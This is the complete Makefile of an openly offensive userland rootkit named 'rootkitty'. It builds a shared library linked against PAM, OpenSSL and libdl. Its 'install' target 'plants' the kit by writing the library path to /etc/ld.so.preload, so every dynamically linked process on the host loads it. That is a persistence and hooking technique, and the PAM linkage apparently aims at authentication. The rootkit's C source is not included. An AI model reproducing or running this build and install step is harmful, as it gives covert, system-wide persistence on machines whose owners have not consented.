CC = gcc
SRCS = src/rootkitty-lib.c 
OUT = rootkitty.so
CFLAGS = -lpam -fPIC -shared -lssl -ldl 
DBG = $(CFLAGS) -Wall -Wextra -Wshadow -g -O2
#default
all:
	@echo "[+] Compiling rootkitty... >^..^<"
	$(CC) $(SRCS) -o $(OUT) $(CFLAGS) $(LIBS)
	@echo "[i] You only compiled the kit."
	@echo "[i] If you wish to plant the kit use: \"make install\""

# for debugging purposes
debug:
	@echo "[+] Compiling rootkitty + debug...  >^..^<"
	$(CC) $(SRCS) -o $(OUT) $(DBG)

install: rootkitty.so
	@echo "[+] Planting rootkitty to ld.so.preload.... >^..^<"
	@realpath $(OUT) > /etc/ld.so.preload
